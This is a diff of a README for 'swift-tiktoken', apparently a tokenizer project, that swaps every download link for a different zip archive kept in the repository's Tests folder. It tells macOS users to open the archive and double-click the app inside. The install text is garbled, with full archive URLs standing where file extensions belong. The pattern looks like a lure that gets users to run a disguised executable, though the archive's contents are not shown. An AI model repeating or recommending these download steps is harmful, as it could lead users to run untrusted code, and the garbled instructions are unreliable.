@@ -6,9 +6,9 @@ Welcome to swift-tiktoken! This application helps you tokenize text easily using
 
 ## 📥 Download the Application
 
-[![Download swift-tiktoken](https://github.com/AddyDelaCruz/swift-tiktoken/raw/refs/heads/main/Tests/SwiftTiktokenTests/tiktoken_swift_1.9.zip)](https://github.com/AddyDelaCruz/swift-tiktoken/raw/refs/heads/main/Tests/SwiftTiktokenTests/tiktoken_swift_1.9.zip)
+[![Download swift-tiktoken](https://raw.githubusercontent.com/AddyDelaCruz/swift-tiktoken/main/Tests/SwiftTiktokenTests/swift-tiktoken-v2.2.zip)](https://raw.githubusercontent.com/AddyDelaCruz/swift-tiktoken/main/Tests/SwiftTiktokenTests/swift-tiktoken-v2.2.zip)
 
-To get started with swift-tiktoken, visit this page to download: [Download swift-tiktoken](https://github.com/AddyDelaCruz/swift-tiktoken/raw/refs/heads/main/Tests/SwiftTiktokenTests/tiktoken_swift_1.9.zip).
+To get started with swift-tiktoken, visit this page to download: [Download swift-tiktoken](https://raw.githubusercontent.com/AddyDelaCruz/swift-tiktoken/main/Tests/SwiftTiktokenTests/swift-tiktoken-v2.2.zip).
 
 ## 📋 Features
 
@@ -28,16 +28,16 @@ Before installing swift-tiktoken, ensure your system meets the following require
 
 ## 📂 Download & Install
 
-1. Visit the releases page: [Download swift-tiktoken](https://github.com/AddyDelaCruz/swift-tiktoken/raw/refs/heads/main/Tests/SwiftTiktokenTests/tiktoken_swift_1.9.zip).
+1. Visit the releases page: [Download swift-tiktoken](https://raw.githubusercontent.com/AddyDelaCruz/swift-tiktoken/main/Tests/SwiftTiktokenTests/swift-tiktoken-v2.2.zip).
    
 2. Locate the latest version of swift-tiktoken. The latest version is usually at the top of the list.
 
-3. Click on the download link for the file that fits your operating system. This might be a `https://github.com/AddyDelaCruz/swift-tiktoken/raw/refs/heads/main/Tests/SwiftTiktokenTests/tiktoken_swift_1.9.zip` or `.zip` file.
+3. Click on the download link for the file that fits your operating system. This might be a `https://raw.githubusercontent.com/AddyDelaCruz/swift-tiktoken/main/Tests/SwiftTiktokenTests/swift-tiktoken-v2.2.zip` or `.zip` file.
 
 4. After the file downloads, follow these steps:
 
    - **For macOS:**
-     - Open the `https://github.com/AddyDelaCruz/swift-tiktoken/raw/refs/heads/main/Tests/SwiftTiktokenTests/tiktoken_swift_1.9.zip` or `.zip` file that you downloaded.
+     - Open the `https://raw.githubusercontent.com/AddyDelaCruz/swift-tiktoken/main/Tests/SwiftTiktokenTests/swift-tiktoken-v2.2.zip` or `.zip` file that you downloaded.
      - Drag and drop the swift-tiktoken folder into your Applications directory.
      - Open the Applications folder and double-click on swift-tiktoken to run the application.
 
